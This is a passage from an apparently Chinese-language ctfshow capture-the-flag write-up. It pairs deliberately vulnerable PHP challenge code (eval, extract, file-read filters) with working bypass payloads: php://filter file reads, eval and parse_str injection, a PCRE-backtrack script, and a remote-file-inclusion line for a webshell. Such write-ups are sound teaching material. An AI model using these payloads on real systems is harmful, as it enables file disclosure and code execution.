v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure><h3 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=php://filter/resource=flag.php</span><br><span class="line">/?file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span><br><span class="line">/?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php</span><br><span class="line">/?file=compress.zlib://flag.php</span><br></pre></td></tr></table></figure><h3 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Linux中，<code>/proc/self/root</code>代表的是根目录，可以多次重复来使函数溢出，require_once包含的软链接层数较多时 once 的 hash 匹配会直接失效造成重复包含。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=compress.zlib://flag.php</span><br><span class="line"></span><br><span class="line">/?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure><h3 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看下可用字符</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;=<span class="number">128</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&#x27;36&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$payload</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$payload</span>).PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现<code>%0C</code>，也就是<code>\f</code>分页符可以利用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?num=%0C36</span><br></pre></td></tr></table></figure><h3 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有<code>空格、+、[</code>则会被转化为<code>_</code>，所以按理来说我们构造不出<code>CTF_SHOW.COM</code>这个变量(因为含有<code>.</code>)，但php中有个特性就是如果传入<code>[</code>，它被转化为<code>_</code>之后，后面的字符就会被保留下来不会被替换</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST：CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</span><br></pre></td></tr></table></figure><h3 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?1=flag.php</span><br><span class="line">POST：CTF_SHOW=$flag&amp;CTF[SHOW.COM=&amp;fun=highlight_file($_GET[1])</span><br></pre></td></tr></table></figure><h3 id="web126"><a href="#web126" class="headerlink" title="*web126"></a>*web126</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="variable">$c</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?a=1+fl0g=flag_give_me</span><br><span class="line">POST:CTF_SHOW=$flag&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</span><br><span class="line"></span><br><span class="line">/?$fl0g=flag_give_me;</span><br><span class="line">POST：CTF_SHOW=$flag&amp;CTF[SHOW.COM=&amp;fun=eval($a[0])</span><br></pre></td></tr></table></figure><h3 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//特殊字符检测</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>空格、<code>+</code>、<code>[</code>会被转化为<code>_</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?ctf show=ilove36d</span><br></pre></td></tr></table></figure><h3 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>_()</strong> 等效于 <strong>gettext()</strong></p><p><strong>get_defined_vars ( void ) : array</strong> 函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure><h3 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?f=/ctfshow/../var/www/html/flag.php</span><br><span class="line">/?f=http://url/xxxx.txt?ctfshow #远程文件包含，在自己服务器上写🐎</span><br><span class="line">/?f=php://filter/ctfshow/resource=flag.php</span><br><span class="line">/?f=php://filter/convert.base64-encode/ctfshow/resource=flag.php</span><br><span class="line">/?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接<code>ctfshow</code>或者利用数组</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST: f=ctfshow</span><br><span class="line">POST: f[]=1</span><br></pre></td></tr></table></figure><p>也可以利用正则最大回溯（<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a>）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7e393df7-54a9-43aa-b855-c2d9ffb0d6bc.challenge.ctf.show/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;a&#x27;</span>*<span class="number">1000000</span> + <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><h3 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title 